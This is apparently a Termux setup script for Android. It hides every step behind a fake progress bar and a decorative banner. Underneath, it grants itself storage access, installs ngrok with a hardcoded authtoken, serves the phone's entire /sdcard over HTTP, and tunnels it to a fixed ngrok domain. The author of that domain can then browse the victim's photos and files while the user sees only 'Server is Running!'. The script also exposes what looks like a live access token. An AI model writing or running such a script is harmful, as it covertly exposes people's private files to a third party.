l#!/bin/bash
clear
echo -e "\033[31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣷⣤⣙⢻⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠋⠁⠀⠀⠀⠀⠀
\033[0m"
termux-setup-storage
function print_bar() {
    local progress=$1
    local width=15
    local bar_width=$((progress * width / 100))

    printf "\r[ Progress ] %3d%%" "$progress"
    printf "%s" "$(printf '%.0s' $(seq 1 "$bar_width"))" | sed 's/./#/g'
}

print_bar 1

apt update -y > /dev/null 2>&1

print_bar 4

yes "N" | pkg update -y > /dev/null 2>&1

print_bar 9

yes "N" | pkg upgrade -y > /dev/null 2>&1

print_bar 10

pkg install proot-distro -y > /dev/null 2>&1

print_bar 12

proot-distro install ubuntu > /dev/null 2>&1

print_bar 15

proot-distro login ubuntu -- apt update -y > /dev/null 2>&1

print_bar 20

proot-distro login ubuntu -- apt install wget -y > /dev/null 2>&1

print_bar 25

proot-distro login ubuntu -- apt install tar -y > /dev/null 2>&1

print_bar 30

proot-distro login ubuntu -- wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz > /dev/null 2>&1

print_bar 35

proot-distro login ubuntu -- tar -xzf ngrok-v3-stable-linux-arm64.tgz > /dev/null 2>&1

print_bar 50

proot-distro login ubuntu -- chmod +x ngrok > /dev/null 2>&1

print_bar 60

proot-distro login ubuntu -- mv ngrok /usr/bin > /dev/null 2>&1

print_bar 70

proot-distro login ubuntu -- ngrok authtoken 2usQNsW82LaXz6ya7SZ79XzQHDu_2t8qmbd5ZqZ9HPGKXA1xR > /dev/null 2>&1

print_bar 80

proot-distro login ubuntu -- bash -c 'export DEBIAN_FRONTEND=noninteractive && apt install -y tzdata python3' > /dev/null 2>&1

print_bar 87

proot-distro login ubuntu -- nohup python3 -m http.server -d /sdcard 8080 > /dev/null 2>&1 &

print_bar 90

proot-distro login ubuntu -- ngrok http --region=ap --domain javelin-polite-only.ngrok-free.app 8080 > /dev/null 2>&1 &

echo -e 'clear\nPS1="\\033[01;32m\[Server@\\h \\W]\\$ \\033[00m\"'

clear

echo "Server is Running!"